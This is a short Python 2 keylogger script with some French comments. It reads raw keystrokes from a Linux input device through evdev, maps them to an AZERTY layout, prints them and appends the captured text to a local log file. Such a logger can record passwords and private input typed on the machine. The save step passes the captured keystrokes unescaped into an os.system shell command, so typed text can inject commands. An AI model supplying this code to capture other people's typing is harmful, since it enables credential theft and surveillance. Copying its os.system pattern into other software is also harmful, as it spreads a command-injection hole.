#!/usr/bin/python
# coding: utf8

import string
import os
import sys
from evdev import InputDevice
from select import select

fichier_log='./keyboard.log'

try:
	userKeyboardDevice = sys.argv[1]
except:
	userKeyboardDevice = '/dev/input/event0'

keys = "X^&é'(-è_çàXazertyuiopXXXXqsdfghjklmXXXXwxcvbn,;:!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
#B=alt

dev = InputDevice(userKeyboardDevice)

if userKeyboardDevice != "" :
	dev=InputDevice(userKeyboardDevice)
def keyspe(touchecode):
	switcher={
	    1: "Escape",
	    3: "é",
	    4: "\"",
	    5: "'",
	    8: "è",
	    9: "_",
	    10: "ç",
	    11: "à",
	    12: ")",
	    13: "=",
	    14: "Backspace",
	    15: "Tab",
	    26: "¨",
	    27: "$",
	    28: "ENTER",
	    29: "Ctrl Gauche",
	    40: "Ù",
	    41: "²",
	    42: "Shift LEFT",
	    43: "*",
	    54: "Shift RIGHT",
	    56: "Alt LEFT",
	    57: "Space",
	    58: "Verr. Num.",
	    59: "F1",
	    60: "F2",
	    61: "F3",
	    62: "F4",
	    63: "F5",
	    64: "F6",
	    65: "F7",
	    66: "F8",
	    67: "F9",
	    68: "F10",
	    69: "F11",
	    70: "F12",
	    99: "Print Scrreen",
	    103: "Arrow UP",
	    104: "Page UP",
	    105: "Arrow RIGHT",
	    106: "Arrow LEFT",
	    108: "Arrow DOWN",
	    109: "Page DOWN",
	    110: "Insert",
	    111: "Del.",
	    999: "XD"
	}
	return switcher.get(touchecode,0)
fullphrase=''
touchecode_previous=-1

os.system('clear');
print "--------------------{KEYBOARD LOGGING STARTED ON DEVICE: "+userKeyboardDevice+"}--------------------------"
print "CTRL+C : Quit"
print "----------------------------------------------------------------------------------------------------------"
try:
	while True:
	   r,w,x = select([dev], [], [])
	   for event in dev.read():
		if event.type==1 and event.value==1:
			touchecode=str(event.code);
			touche=keys[ int(touchecode) ];
			touchecodeascii=str(ord(touche));
			ks=keyspe(int(touchecode));
			if ks != 0:
				touche=" ["+ks+"] ";

			if ( touchecode_previous == 42 ) or ( touchecode_previous == 54):
				touche=" [SHIFT "+touche+"] ";
			#try:
			#	os.system('clear');
			#except:
			#	error="true"
			#print "--------------------{KEYBOARD LOGGING STARTED ON DEVICE: "+userKeyboardDevice+"}--------------------------"

		        #print( '\n[+] CODE TOUCHE:'+ touchecode +' => TOUCHE: "'+touche+'"(ASCII:'+touchecodeascii+') '+str(touchecode_previous)+'') #<'+str(ks)+'>
			print("\n[+] Key: "+touche+"") #<'+str(ks)+'>
			fullphrase=str(fullphrase+touche)
			touchecode_previous=int(touchecode);
			#print("[+] FULL SENTENSE:\n"+fullphrase+"");
except:
	print "----------------------------------------------------------------------------------------------------------"
	print( '\n[+] Recorded sentense:\n'+fullphrase);
	try:
		os.system('/bin/echo -e $(/bin/date "+%s")\'\t'+fullphrase+'\' >> '+fichier_log+'');
		print( '\n[+] saved in :'+fichier_log);
	except:
		print( '\n[X] Impossible to save in :'+fichier_log);


print "----------------------------------------------------------------------------------------------------------"
print( '\n[+] Bye!')
